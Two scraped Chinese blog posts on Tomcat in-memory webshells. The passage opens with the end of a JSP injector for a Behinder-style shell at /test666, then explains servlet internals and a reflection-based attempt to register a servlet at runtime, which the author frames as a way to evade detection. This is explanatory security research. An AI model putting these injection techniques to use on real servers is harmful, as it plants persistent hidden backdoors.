out.println(<span class="string">"Servlet has been Inject,please visit /test666 to access shell and visit /test666?sectest666=unload to unload shell!!!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​        效果如下：</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133641319.png" alt="image-20210105133641319"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133705533.png" alt="image-20210105133705533"></p>
<p>​        访问unload接口删除内存马</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133718522.png" alt></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105133734706.png" alt="image-20210105133734706"></p>
<p>​        </p>
<h4 id><a href="#" class="headerlink" title></a></h4>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">Tomcat内存马实现原理解析-servlet内存马</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-31 10:25:16" itemprop="dateCreated datePublished" datetime="2020-12-31T10:25:16+08:00">2020-12-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-05 12:08:07" itemprop="dateModified" datetime="2021-01-05T12:08:07+08:00">2021-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        除了通过Filter实现的内存马，也可以使用servlet，listener等实现内存马，不同的实现方式需要不同的查杀方式，有可能使用不同类型的内存马就可以绕过查杀，本片文章将带着大家了解servlet的入门、tomcat下servlet的实现、servlet内存马的实现。</p>
<h2 id="servlet基础入门"><a href="#servlet基础入门" class="headerlink" title="servlet基础入门"></a>servlet基础入门</h2><h3 id="什么是servlet"><a href="#什么是servlet" class="headerlink" title="什么是servlet?"></a>什么是servlet?</h3><h4 id="servlet基本介绍"><a href="#servlet基本介绍" class="headerlink" title="servlet基本介绍"></a>servlet基本介绍</h4><p>​        servlet是一个Java应用程序，运行在服务器端，用来处理客户端请求并作出响应的程序。servlet没有main方法不能独立运行，需要使用servlet容器比如tomcat来创建。当我们通过URL来访问servlet，首先会在servlet容器中判断该URL是由哪个servlet处理的，当前容器中是否有这个servlet实例，如果没有则创建servlet实例，并交由对应servlet的service方法来处理请求，处理结束后再返回web服务器。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231105141162.png" alt="image-20201231105141162"></p>
<p>​        servlet接口分别有如下几个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException</span>; <span class="comment">// init方法，创建好实例后会被立即调用，仅调用一次。</span></span><br><span class="line"></span><br><span class="line">    <span class="function">ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span>;<span class="comment">//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException</span>;  <span class="comment">//每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。</span></span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getServletInfo</span><span class="params">()</span></span>;<span class="comment">//返回有关servlet的信息，如作者、版本和版权.</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;<span class="comment">//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h4><p>​        实例化：在第一次访问或启动tomcat时，tomcat会调用此无参构造方法实例化servlet。默认情况下在tomcat开启的时候不会实例化我们自定义的servlet，当我们第一次访问该servlet的时候才会去创建实例。org.apache.catalina.core.DefaultInstanceManager#newInstance(java.lang.String)</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113046827.png" alt="image-20201231113046827"></p>
<p>​        初始化：tomcat在实例化此servlet后，会立即调用init方法初始化servlet。org.apache.catalina.core.StandardWrapper#initServlet</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113147029.png" alt="image-20201231113147029"></p>
<p>就绪：容器收到请求后调用servlet的service方法来处理请求。org.apache.catalina.core.ApplicationFilterChain#internalDoFilter，servlet.service()方法会在过滤器链执行结束后执行。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113326086.png" alt="image-20201231113326086"></p>
<p>销毁：容器依据自身算法删除servlet对象，删除前会调用destory方法，重写destroy方法，关闭tomcat时会执行servlet的destory方法。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113716361.png" alt="image-20201231113716361"></p>
<p>​    总体过程如下所示：</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231115816760.png" alt="image-20201231115816760"></p>
<h4 id="servlet实现类介绍"><a href="#servlet实现类介绍" class="headerlink" title="servlet实现类介绍"></a>servlet实现类介绍</h4><p><strong>GenericServlet</strong></p>
<p>​        GenericServlet是Servlet 接口和 ServletConfig 接口的实现类. 但是一个抽象类，其中的 service 方法为抽象方法。也就是说如果继承了这个抽象类，只有service方法是必须重写的。</p>
<p><strong>HttpServlet</strong></p>
<p>​        HttpServlet是GenericServlet的子类，在HttpServlet中对GenericServlet进行了扩展重写了service方法，根据不同的请求方式，调用不同的方法处理请求。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String method = req.getMethod();</span><br><span class="line">    <span class="keyword">long</span> lastModified;</span><br><span class="line">    <span class="keyword">if</span> (method.equals(<span class="string">"GET"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">if</span> (lastModified == -<span class="number">1L</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">long</span> ifModifiedSince;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ifModifiedSince = req.getDateHeader(<span class="string">"If-Modified-Since"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">                ifModifiedSince = -<span class="number">1L</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ifModifiedSince &lt; lastModified / <span class="number">1000L</span> * <span class="number">1000L</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">                <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resp.setStatus(<span class="number">304</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"HEAD"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">        <span class="keyword">this</span>.doHead(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"PUT"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPut(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"DELETE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doDelete(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"OPTIONS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doOptions(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"TRACE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doTrace(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String errMsg = lStrings.getString(<span class="string">"http.method_not_implemented"</span>);</span><br><span class="line">        Object[] errArgs = <span class="keyword">new</span> Object[]&#123;method&#125;;</span><br><span class="line">        errMsg = MessageFormat.format(errMsg, errArgs);</span><br><span class="line">        resp.sendError(<span class="number">501</span>, errMsg);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>HttpServletRequest和HttpServletResponse</strong></p>
<p>​        在HTTPServlet.service()中传入了HttpServletRequest和HttpServletResponse对象,通过这两个对象可以获得请求和响应中的信息。</p>
<p><strong>HttpServletRequest</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getParameter() <span class="comment">//根据参数的内容获取参数值</span></span><br><span class="line">getRequestURI() <span class="comment">//获取请求的URI</span></span><br><span class="line">getQueryString() <span class="comment">//获取get请求中？后的内容</span></span><br><span class="line">getServletPath() <span class="comment">//获取servlet的路径</span></span><br><span class="line">getCookies() <span class="comment">//获取cookie中的信息</span></span><br></pre></td></tr></table></figure>

<p><strong>HttpServletResponse</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addCookie() <span class="comment">//添加cookie</span></span><br><span class="line">sendRedirect() <span class="comment">//设置重定向</span></span><br><span class="line">getWriter() <span class="comment">// 返回 PrintWriter 对象. 调用该对象的 print() 方法, 将把 print() 中的参数直接打印到客户的浏览器上.</span></span><br></pre></td></tr></table></figure>

<h3 id="如何使用servlet？"><a href="#如何使用servlet？" class="headerlink" title="如何使用servlet？"></a>如何使用servlet？</h3><p>​        servlet的创建和filter的创建类似，也有两种形式：</p>
<ul>
<li>web.xml中配置声明</li>
<li>@WebServlet注解声明</li>
</ul>
<h4 id="web-xml配置servlet"><a href="#web-xml配置servlet" class="headerlink" title="web.xml配置servlet"></a>web.xml配置servlet</h4><p>​        web.xml配置如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt; //servlet 的名字</span><br><span class="line">    &lt;servlet-<span class="class"><span class="keyword">class</span>&gt;<span class="title">HelloWorld</span>&lt;/<span class="title">servlet</span>-<span class="title">class</span>&gt;  //<span class="title">servlet</span>类的全类名</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">servlet</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">servlet</span>-<span class="title">name</span>&gt;<span class="title">HelloWorld</span>&lt;/<span class="title">servlet</span>-<span class="title">name</span>&gt;   //<span class="title">servlet</span> 的名字</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/<span class="title">HelloWorld</span>&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;  //访问<span class="title">servlet</span>的路径</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        引用一张图来说明容器如何根据请求的url找到处理servlet的类,当我们发起一个请求时，会去判断我们请求的路径是否符合url-pattern匹配的内容，匹配成功会找到对应的servlet-name来处理，再根据servlet-name找到servlet-class来处理。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231135749685.png" alt="image-20201231135749685"></p>
<p>​        实际上同一个servlet类可以对应多个servlet-mapping</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;   //servlet 的名字</span><br><span class="line">    &lt;url-pattern&gt;/test666&lt;/url-pattern&gt;  //访问servlet的路径</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;   //servlet 的名字</span><br><span class="line">    &lt;url-pattern&gt;/HelloWorld&lt;/url-pattern&gt;  //访问servlet的路径</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>​        接下来我们要编写HelloWorld,我们实现的Servlet类需要继承HttpServlet，并重写几个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"servlet has been destory!!!"</span>);</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        由于定义了两个servlet-mapping，因此可以通过不同的路径来请求同一个servlet。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231143118256.png" alt="image-20201231143118256"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231142000181.png" alt="image-20201231142000181"></p>
<h4 id="WebServlet注解配置servlet"><a href="#WebServlet注解配置servlet" class="headerlink" title="WebServlet注解配置servlet"></a>WebServlet注解配置servlet</h4><p>​        通过注解同样可以完成上述的servlet的配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"HelloWorld"</span>,urlPatterns = &#123;<span class="string">"/HelloWorld"</span>,<span class="string">"/test666"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"servlet has been destory!!!"</span>);</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144016548.png" alt="image-20201231144016548"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144029960.png" alt="image-20201231144029960"></p>
<h2 id="动态注册servlet"><a href="#动态注册servlet" class="headerlink" title="动态注册servlet"></a>动态注册servlet</h2><h3 id="失败尝试"><a href="#失败尝试" class="headerlink" title="失败尝试"></a>失败尝试</h3><p>​        之前了解过动态注入Filter的技术，以为实现动态注册servlet的方法应该类似，因此使用下面的代码来实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>); <span class="comment">//查看自定义的servlet是否添加成功</span></span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); <span class="comment">//设置state的值，否则执行addservlet方法会报错</span></span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); <span class="comment">//创建tomcatservlet实例</span></span><br><span class="line">                        ServletRegistration.Dynamic reg = servletContext.addServlet(<span class="string">"test"</span>, tomcatServlet);   <span class="comment">//添加servlet</span></span><br><span class="line">                        reg.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">                        reg.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">                        reg.addMapping(<span class="string">"/test666"</span>);  <span class="comment">//添加URL地址映射关系</span></span><br><span class="line">                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED); <span class="comment">//将state的值还原</span></span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>​        但是使用这种方式动态添加servlet后访问却是404。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231152513184.png" alt="image-20201231152513184"></p>
<h3 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h3><h4 id="mapping未添加成功"><a href="#mapping未添加成功" class="headerlink" title="mapping未添加成功"></a>mapping未添加成功</h4><p>​        一般来讲，我们添加的mapping会被保存到<code>standardContext.servletMappings</code>中，可以查看该字段来查看mapping是否添加成功，这里可以看到自定义的mapping是添加成功了。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231153355218.png" alt="image-20201231153355218"></p>
<h4 id="servlet未添加成功"><a href="#servlet未添加成功" class="headerlink" title="servlet未添加成功"></a>servlet未添加成功</h4><p>​        跟进org.apache.catalina.core.ApplicationContext#addServlet(java.lang.String, java.lang.String, javax.servlet.Servlet, java.util.Map&lt;java.lang.String,java.lang.String&gt;） ，我抽出一些比较关键的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Wrapper wrapper = (Wrapper) context.findChild(servletName);  <span class="comment">//检测context中是否已经包含了servlet。</span></span><br><span class="line">  <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;  <span class="comment">//由于这个servlet是动态添加的，因此wrapper的内容为空</span></span><br><span class="line">            wrapper = context.createWrapper(); <span class="comment">//创建一个wrapper</span></span><br><span class="line">            wrapper.setName(servletName);  <span class="comment">//设置servlet的name</span></span><br><span class="line">            context.addChild(wrapper);  <span class="comment">//将wrapper添加到当前的context中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="keyword">null</span>) &#123;  <span class="comment">//判断servlet是否为空，由于传入了servlet对象，因此会执行else中的内容</span></span><br><span class="line">            wrapper.setServletClass(servletClass);</span><br><span class="line">            Class&lt;?&gt; clazz = Introspection.loadClass(context, servletClass);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                annotation = clazz.getAnnotation(ServletSecurity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wrapper.setServletClass(servlet.getClass().getName());  <span class="comment">//wrapper中添加servlet</span></span><br><span class="line">            wrapper.setServlet(servlet);  <span class="comment">//设置servlet对象</span></span><br><span class="line">            <span class="keyword">if</span> (context.wasCreatedDynamicServlet(servlet)) &#123;</span><br><span class="line">                annotation = servlet.getClass().getAnnotation(ServletSecurity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的代码，将servlet的实例和servletClass等属性添加到context中，servlet添加也没有问题。执行addservlet和addMapping后，可以看到已经将servlet的instance对象、mappings映射、servletClass等内容添加到context中。</p>
